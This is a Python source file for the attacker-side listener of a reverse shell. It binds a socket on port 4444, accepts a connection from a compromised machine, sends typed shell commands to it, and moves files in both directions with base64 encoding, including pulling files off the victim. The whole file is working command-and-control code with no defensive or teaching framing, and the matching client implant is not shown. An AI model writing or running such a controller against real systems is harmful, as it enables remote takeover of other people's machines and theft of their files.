import socket
import json
import base64

def server(ip, port):
    global target
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print('[+] Listening for connections....')
    target, address = listener.accept()
    print(f"[+] Got a connection from {address}")

def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        try:
            command = input('Shell#: ')
            send(command)

            if command == 'exit':
                break
            elif command[:2] == 'cd' and len(command) > 1:
                continue
            elif command[:8] == 'download':
                with open(command[9:], 'wb') as f:
                    file_data = receive()
                    f.write(base64.b64decode(file_data))
            elif command[:6] == 'upload':
                try:
                    with open(command[7:], 'rb') as f:
                        send(base64.b64encode(f.read()).decode('utf-8'))
                except FileNotFoundError:
                    print("[-] File not found on server.")
                    send(None)
            else:
                result = receive()
                print(result)
        except Exception as e:
            print(f"[-] An error occurred: {e}")
            break

# Replace '192.168.1.102' with your actual local IP address 
#In Server code we specify IP as 0.0.0.0 because every client should be visible in the network range

server('192.168.1.102', 4444)
run()
